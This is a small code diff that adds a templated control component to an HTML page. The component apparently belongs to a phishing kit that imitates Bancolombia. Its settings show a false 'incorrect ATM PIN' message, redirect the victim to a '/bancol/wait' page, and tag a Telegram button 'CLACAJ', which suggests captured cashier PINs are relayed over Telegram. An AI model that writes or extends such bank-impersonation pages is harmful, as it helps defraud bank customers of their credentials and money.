@@ -287,6 +287,14 @@
         }
     </script>
 
+    <x-control
+        :auto-completar="false"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="Clave de cajero incorrercta. Intenta nuevamente"
+        telegram-button="CLACAJ"
+    />
+
 </body>
 
 </html>
